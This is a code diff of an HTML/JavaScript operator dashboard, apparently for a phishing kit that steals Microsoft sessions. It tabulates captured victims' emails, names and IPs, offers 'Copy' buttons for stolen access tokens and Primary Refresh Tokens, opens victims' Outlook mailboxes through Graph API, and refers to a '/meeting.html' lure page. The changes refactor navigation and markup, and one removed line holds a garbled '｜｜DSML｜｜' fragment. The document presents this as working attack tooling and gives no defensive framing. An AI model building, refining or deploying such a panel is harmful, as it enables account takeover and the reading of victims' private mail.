@@ -113,7 +113,7 @@
         .btn-success { background: #10b981; color: white; }
         
         .form-group { margin-bottom: 16px; }
-        .form-group label { display: block; margin-bottom: 6px; font-size: 12px; color: #9ca3af; }
+        .form-group label { display: block; margin-bottom: 6px; font-size: 12px; }
         .form-control {
             width: 100%;
             padding: 10px 12px;
@@ -221,11 +221,11 @@
     
     <div class="main">
         <div class="sidebar">
-            <div class="nav-item active" onclick="showView('dashboard')"><span>📊</span> Dashboard</div>
-            <div class="nav-item" onclick="showView('sessions')"><span>📋</span> Sessions</div>
-            <div class="nav-item" onclick="showView('tokens')"><span>🔑</span> Tokens</div>
-            <div class="nav-item" onclick="showView('mailbox')"><span>📧</span> Mailbox</div>
-            <div class="nav-item" onclick="showView('settings')"><span>⚙️</span> Settings</div>
+            <div class="nav-item active" data-view="dashboard">📊 Dashboard</div>
+            <div class="nav-item" data-view="sessions">📋 Sessions</div>
+            <div class="nav-item" data-view="tokens">🔑 Tokens</div>
+            <div class="nav-item" data-view="mailbox">📧 Mailbox</div>
+            <div class="nav-item" data-view="settings">⚙️ Settings</div>
         </div>
         
         <div class="content">
@@ -240,75 +240,105 @@
                 
                 <div class="card">
                     <div class="card-header"><span class="card-title">🌍 Active Sessions by Region</span></div>
-                    <div class="card-body"><div id="countryStatsContainer" class="country-stats-grid"><div class="loading">No sessions yet. Authenticate first.</div></div></div>
+                    <div class="card-body"><div id="countryStatsContainer" class="country-stats-grid"><div class="loading">Loading...</div></div></div>
                 </div>
                 
                 <div class="card">
                     <div class="card-header"><span class="card-title">Recent Sessions</span><button class="btn btn-outline" onclick="loadDashboard()">Refresh</button></div>
                     <div class="table-wrapper">
-                        <table id="recentTable"><thead><tr><th>Email</th><th>Name</th><th>Country</th><th>IP</th><th>Captured</th></tr></thead><tbody id="recentBody"><tr><td colspan="5" class="loading">Click Refresh to load...<\/td><\/tr><\/tbody><\/table>
-                    <\/div>
-                <\/div>
-            <\/div>
+                        <table>
+                            <thead><tr><th>Email</th><th>Name</th><th>Country</th><th>IP</th><th>Captured</th></tr></thead>
+                            <tbody id="recentBody"><tr><td colspan="5" class="loading">Loading...</td></tr></tbody>
+                        </table>
+                    </div>
+                </div>
+            </div>
             
             <!-- Sessions View -->
             <div id="sessionsView" class="view">
                 <div class="card">
-                    <div class="card-header"><span class="card-title">All Captured Sessions<\/span><button class="btn btn-danger" onclick="clearAllSessions()">Clear All<\/button><\/div>
+                    <div class="card-header"><span class="card-title">All Captured Sessions</span><button class="btn btn-danger" onclick="clearAllSessions()">Clear All</button></div>
                     <div class="table-wrapper">
-                        <table id="sessionsTable"><thead><tr><th>ID<\/th><th>Email<\/th><th>Name<\/th><th>Country<\/th><th>IP<\/th><th>Type<\/th><th>Captured<\/th><th>Expires<\/th><th>Actions<\/th><\/tr><\/thead><tbody id="sessionsBody"><tr><td colspan="9" class="loading">No sessions. Please authenticate first.<\/td><\/tr><\/tbody><\/table>
-                    <\/div>
-                <\/div>
-            <\/div>
+                        <table>
+                            <thead><tr><th>ID</th><th>Email</th><th>Name</th><th>Country</th><th>IP</th><th>Type</th><th>Captured</th><th>Expires</th><th>Actions</th></tr></thead>
+                            <tbody id="sessionsBody"><tr><td colspan="9" class="loading">Loading...</td></tr></tbody>
+                        </table>
+                    </div>
+                </div>
+            </div>
             
             <!-- Tokens View -->
             <div id="tokensView" class="view">
                 <div class="grid-2">
                     <div class="card">
-                        <div class="card-header"><span class="card-title">Access Tokens<\/span><\/div>
-                        <div class="table-wrapper"><table id="accessTokensTable"><thead><tr><th>User<\/th><th>Resource<\/th><th>Issued<\/th><th>Expires<\/th><th>Action<\/th><\/tr><\/thead><tbody id="accessTokensBody"><td><td colspan="5" class="loading">No access tokens<\/td><\/tr><\/tbody><\/table><\/div>
-                    <\/div>
+                        <div class="card-header"><span class="card-title">Access Tokens</span></div>
+                        <div class="table-wrapper">
+                            <table>
+                                <thead><tr><th>User</th><th>Resource</th><th>Issued</th><th>Expires</th><th>Action</th></tr></thead>
+                                <tbody id="accessTokensBody"><tr><td colspan="5" class="loading">Loading...</td></tr></tbody>
+                            </table>
+                        </div>
+                    </div>
                     <div class="card">
-                        <div class="card-header"><span class="card-title">Refresh Tokens (PRT)<\/span><\/div>
-                        <div class="table-wrapper"><table id="refreshTokensTable"><thead><tr><th>User<\/th><th>Resource<\/th><th>Action<\/th><\/tr><\/thead><tbody id="refreshTokensBody"><tr><td colspan="3" class="loading">No PRT tokens<\/td><\/tr><\/tbody><\/table><\/div>
-                    <\/div>
-                <\/div>
-            <\/div>
+                        <div class="card-header"><span class="card-title">Refresh Tokens (PRT)</span></div>
+                        <div class="table-wrapper">
+                            <table>
+                                <thead><tr><th>User</th><th>Resource</th><th>Action</th></tr></thead>
+                                <tbody id="refreshTokensBody"><tr><td colspan="3" class="loading">Loading...</td></tr></tbody>
+                            </table>
+                        </div>
+                    </div>
+                </div>
+            </div>
             
             <!-- Mailbox View -->
             <div id="mailboxView" class="view">
                 <div class="card">
-                    <div class="card-header"><span class="card-title">Open User Mailbox<\/span><\/div>
+                    <div class="card-header"><span class="card-title">Open User Mailbox</span></div>
                     <div class="card-body">
-                        <div class="form-group"><label>Select User Session</label><select id="mailboxUserSelect" class="form-control"><option value="">No sessions available. Authenticate first.</option><\/select><\/div>
+                        <div class="form-group"><label>Select User Session</label>
+                            <select id="mailboxUserSelect" class="form-control">
+                                <option value="">Loading sessions...</option>
+                            </select>
+                        </div>
                         <button class="btn btn-primary" onclick="openMailbox()">📧 Open Full Mailbox</button>
-                        <p style="font-size: 11px; color: #6b7280; margin-top: 12px;">Opens in a new tab with complete Outlook-style interface<\/p>
-                    <\/div>
-                <\/div>
-            <\/div>
+                        <p style="font-size: 11px; color: #6b7280; margin-top: 12px;">Opens in a new tab with complete Outlook-style interface</p>
+                    </div>
+                </div>
+            </div>
             
             <!-- Settings View -->
             <div id="settingsView" class="view">
                 <div class="grid-2">
                     <div class="card">
-                        <div class="card-header"><span class="card-title">Resource Selector<\/span><\/div>
+                        <div class="card-header"><span class="card-title">Resource Selector</span></div>
                         <div class="card-body">
-                            <div class="form-group"><label>Active Resource<\/label><select id="activeResource" class="form-control"><option value="graph">Graph API (Outlook/OneDrive)<\/option><option value="prt">PRT Token<\/option><\/select><\/div>
-                            <button class="btn btn-primary" onclick="saveResourceSettings()">Save Settings<\/button>
-                        <\/div>
-                    <\/div>
+                            <div class="form-group"><label>Active Resource</label>
+                                <select id="activeResource" class="form-control">
+                                    <option value="graph">Graph API (Outlook/OneDrive)</option>
+                                    <option value="prt">PRT Token</option>
+                                </select>
+                            </div>
+                            <button class="btn btn-primary" onclick="saveResourceSettings()">Save Settings</button>
+                        </div>
+                    </div>
                     <div class="card">
-                        <div class="card-header"><span class="card-title">🤖 OpenAI Integration<\/span><\/div>
+                        <div class="card-header"><span class="card-title">🤖 OpenAI Integration</span></div>
                         <div class="card-body">
-                            <div class="form-group"><label>Enable AI<\/label><select id="openaiEnabled" class="form-control"><option value="false">Disabled<\/option><option value="true">Enabled<\/option><\/select><\/div>
-                            <div class="form-group"><label>API Key<\/label><input type="password" id="openaiApiKey" class="form-control" placeholder="sk-..."><\/div>
-                            <button class="btn btn-primary" onclick="saveOpenAISettings()">Save<\/button>
-                        <\/div>
-                    <\/div>
-                <\/div>
-            <\/div>
-        <\/div>
-    <\/div>
+                            <div class="form-group"><label>Enable AI</label>
+                                <select id="openaiEnabled" class="form-control">
+                                    <option value="false">Disabled</option>
+                                    <option value="true">Enabled</option>
+                                </select>
+                            </div>
+                            <div class="form-group"><label>API Key</label><input type="password" id="openaiApiKey" class="form-control" placeholder="sk-..."></div>
+                            <button class="btn btn-primary" onclick="saveOpenAISettings()">Save</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
     
     <!-- Token Modal -->
     <div id="tokenModal" class="modal">
@@ -335,23 +365,26 @@
         function formatDate(dateStr) { return dateStr ? new Date(dateStr).toLocaleString() : 'Unknown'; }
         function escapeHtml(str) { if (!str) return ''; return str.replace(/[&<>]/g, m => ({'&':'&amp;','<':'&lt;','>':'&gt;'})[m]); }
         
-        function showView(view) {
-            document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
-            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
-            document.getElementById(`${view}View`).classList.add('active');
-            event.target.classList.add('active');
-            
-            if (view === 'dashboard') loadDashboard();
-            if (view === 'sessions') loadSessions();
-            if (view === 'tokens') loadTokens();
-            if (view === 'mailbox') loadMailboxSelect();
-        }
+        // Navigation
+        document.querySelectorAll('.nav-item').forEach(item => {
+            item.addEventListener('click', function() {
+                const view = this.getAttribute('data-view');
+                document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+                this.classList.add('active');
+                document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
+                document.getElementById(view + 'View').classList.add('active');
+                
+                if (view === 'dashboard') loadDashboard();
+                if (view === 'sessions') loadSessions();
+                if (view === 'tokens') loadTokens();
+                if (view === 'mailbox') loadMailboxSelect();
+            });
+        });
         
         // Dashboard
         async function loadDashboard() {
             console.log('Loading dashboard...');
             
-            // Get overview stats
             const overview = await apiCall('/api/overview_stats');
             if (overview) {
                 document.getElementById('totalVisits').innerHTML = overview.totalVisits || 0;
@@ -362,7 +395,6 @@
                 document.getElementById('statPRT').innerHTML = overview.totalPRTs || 0;
             }
             
-            // Get country stats
             const stats = await apiCall('/api/country_stats');
             if (stats && stats.countries && Object.keys(stats.countries).length > 0) {
                 const flagMap = { 'United States': '🇺🇸', 'Canada': '🇨🇦', 'United Kingdom': '🇬🇧', 'Germany': '🇩🇪', 'France': '🇫🇷', 'Japan': '🇯🇵', 'Australia': '🇦🇺', 'India': '🇮🇳', 'Netherlands': '🇳🇱', 'Sweden': '🇸🇪', 'Other': '🌍' };
@@ -372,13 +404,12 @@
                 document.getElementById('countryStatsContainer').innerHTML = '<div class="loading">No sessions yet. Go to /meeting.html to authenticate.</div>';
             }
             
-            // Get recent sessions
             const sessions = await apiCall('/api/sessions');
             if (sessions && sessions.sessions && sessions.sessions.length > 0) {
                 const recent = sessions.sessions.slice(0, 5);
-                document.getElementById('recentBody').innerHTML = recent.map(s => `<tr><td style="color:#60a5fa;">${escapeHtml(s.email)}<\/td><td>${escapeHtml(s.name || '-')}<\/td><td>${escapeHtml(s.country || 'Unknown')}<\/td><td><code>${escapeHtml(s.ip || 'Unknown')}<\/code><\/td><td>${formatDate(s.capturedAt)}<\/td><\/tr>`).join('');
+                document.getElementById('recentBody').innerHTML = recent.map(s => `<tr><td style="color:#60a5fa;">${escapeHtml(s.email)}</td><td>${escapeHtml(s.name || '-')}</td><td>${escapeHtml(s.country || 'Unknown')}</td><td><code>${escapeHtml(s.ip || 'Unknown')}</code></td><td>${formatDate(s.capturedAt)}</td></tr>`).join('');
             } else {
-                document.getElementById('recentBody').innerHTML = '<tr><td colspan="5" class="loading">No sessions yet. Visit /meeting.html to authenticate.<\/td><\/tr>';
+                document.getElementById('recentBody').innerHTML = '<tr><td colspan="5" class="loading">No sessions yet. Visit /meeting.html to authenticate.</td></tr>';
             }
         }
         
@@ -387,23 +418,23 @@
             console.log('Loading sessions...');
             const data = await apiCall('/api/sessions');
             if (data && data.sessions && data.sessions.length > 0) {
-                document.getElementById('sessionsBody').innerHTML = data.sessions.map(s => `｜｜DSML｜｜
-                    <td>${s.id}<\/td>
-                    <td style="color:#60a5fa;">${escapeHtml(s.email)}<\/td>
-                    <td>${escapeHtml(s.name || '-')}<\/td>
-                    <td>${escapeHtml(s.country || 'Unknown')}<\/td>
-                    <td><code>${escapeHtml(s.ip || 'Unknown')}<\/code><\/td>
-                    <td><span class="badge-success">${escapeHtml(s.type || 'Graph API')}<\/span><\/td>
-                    <td>${formatDate(s.capturedAt)}<\/td>
-                    <td>${s.hasPRT ? 'Permanent (PRT)' : formatDate(s.expiresAt)}<\/td>
+                document.getElementById('sessionsBody').innerHTML = data.sessions.map(s => `<tr>
+                    <td>${s.id}</td>
+                    <td style="color:#60a5fa;">${escapeHtml(s.email)}</td>
+                    <td>${escapeHtml(s.name || '-')}</td>
+                    <td>${escapeHtml(s.country || 'Unknown')}</td>
+                    <td><code>${escapeHtml(s.ip || 'Unknown')}</code></td>
+                    <td><span class="badge-success">${escapeHtml(s.type || 'Graph API')}</span></td>
+                    <td>${formatDate(s.capturedAt)}</td>
+                    <td>${s.hasPRT ? 'Permanent (PRT)' : formatDate(s.expiresAt)}</td>
                     <td>
-                        <button class="btn btn-outline" style="padding: 2px 6px;" onclick="viewToken('${escapeHtml(s.email)}', 'access')">🔑 Token<\/button>
-                        ${s.hasPRT ? `<button class="btn btn-outline" style="padding: 2px 6px;" onclick="viewToken('${escapeHtml(s.email)}', 'prt')">🔄 PRT<\/button>` : ''}
-                        <button class="btn btn-primary" style="padding: 2px 6px;" onclick="openFullMailbox('${escapeHtml(s.email)}')">📧 Mailbox<\/button>
-                    <\/td>
-                <\/tr>`).join('');
+                        <button class="btn btn-outline" style="padding: 2px 6px;" onclick="viewToken('${escapeHtml(s.email)}', 'access')">🔑 Token</button>
+                        ${s.hasPRT ? `<button class="btn btn-outline" style="padding: 2px 6px;" onclick="viewToken('${escapeHtml(s.email)}', 'prt')">🔄 PRT</button>` : ''}
+                        <button class="btn btn-primary" style="padding: 2px 6px;" onclick="openFullMailbox('${escapeHtml(s.email)}')">📧 Mailbox</button>
+                    </td>
+                </tr>`).join('');
             } else {
-                document.getElementById('sessionsBody').innerHTML = '<tr><td colspan="9" class="loading">No sessions. Visit /meeting.html to authenticate.<\/td><\/tr>';
+                document.getElementById('sessionsBody').innerHTML = '<tr><td colspan="9" class="loading">No sessions. Visit /meeting.html to authenticate.</td></tr>';
             }
         }
         
@@ -441,16 +472,16 @@
             console.log('Loading tokens...');
             const accessTokens = await apiCall('/api/list_access_tokens');
             if (accessTokens && accessTokens.length > 0) {
-                document.getElementById('accessTokensBody').innerHTML = accessTokens.map(t => `<tr><td style="color:#60a5fa;">${escapeHtml(t.user)}<\/td><td>${escapeHtml(t.resource)}<\/td><td>${formatDate(t.issued_at)}<\/td><td>${formatDate(t.expires_at)}<\/td><td><button class="btn btn-outline" onclick="copyToken('${escapeHtml(t.accesstoken)}')">Copy<\/button><\/td><\/tr>`).join('');
+                document.getElementById('accessTokensBody').innerHTML = accessTokens.map(t => `<tr><td style="color:#60a5fa;">${escapeHtml(t.user)}</td><td>${escapeHtml(t.resource)}</td><td>${formatDate(t.issued_at)}</td><td>${formatDate(t.expires_at)}</td><td><button class="btn btn-outline" onclick="copyToken('${escapeHtml(t.accesstoken)}')">Copy</button></td></tr>`).join('');
             } else {
-                document.getElementById('accessTokensBody').innerHTML = '<tr><td colspan="5" class="loading">No access tokens<\/td><\/tr>';
+                document.getElementById('accessTokensBody').innerHTML = '<tr><td colspan="5" class="loading">No access tokens</td></tr>';
             }
             
             const refreshTokens = await apiCall('/api/list_refresh_tokens');
             if (refreshTokens && refreshTokens.length > 0) {
-                document.getElementById('refreshTokensBody').innerHTML = refreshTokens.map(t => `<tr><td style="color:#60a5fa;">${escapeHtml(t.user)}<\/td><td>${escapeHtml(t.resource)}<\/td><td><button class="btn btn-outline" onclick="copyToken('${escapeHtml(t.refreshtoken)}')">Copy PRT<\/button><\/td><\/tr>`).join('');
+                document.getElementById('refreshTokensBody').innerHTML = refreshTokens.map(t => `<tr><td style="color:#60a5fa;">${escapeHtml(t.user)}</td><td>${escapeHtml(t.resource)}</td><td><button class="btn btn-outline" onclick="copyToken('${escapeHtml(t.refreshtoken)}')">Copy PRT</button></td></tr>`).join('');
             } else {
-                document.getElementById('refreshTokensBody').innerHTML = '<tr><td colspan="3" class="loading">No PRT tokens<\/td><\/tr>';
+                document.getElementById('refreshTokensBody').innerHTML = '<tr><td colspan="3" class="loading">No PRT tokens</td></tr>';
             }
         }
         
@@ -490,7 +521,6 @@
         }
         
         // Initial load
-        console.log('Page loaded, loading data...');
         loadDashboard();
         loadSessions();
         loadTokens();
@@ -498,9 +528,10 @@
         
         // Auto-refresh every 10 seconds
         setInterval(() => {
-            if (document.querySelector('.nav-item.active').innerText.includes('Dashboard')) loadDashboard();
-            if (document.querySelector('.nav-item.active').innerText.includes('Sessions')) loadSessions();
-            if (document.querySelector('.nav-item.active').innerText.includes('Tokens')) loadTokens();
+            const activeView = document.querySelector('.nav-item.active').getAttribute('data-view');
+            if (activeView === 'dashboard') loadDashboard();
+            if (activeView === 'sessions') loadSessions();
+            if (activeView === 'tokens') loadTokens();
         }, 10000);
     </script>
 </body>
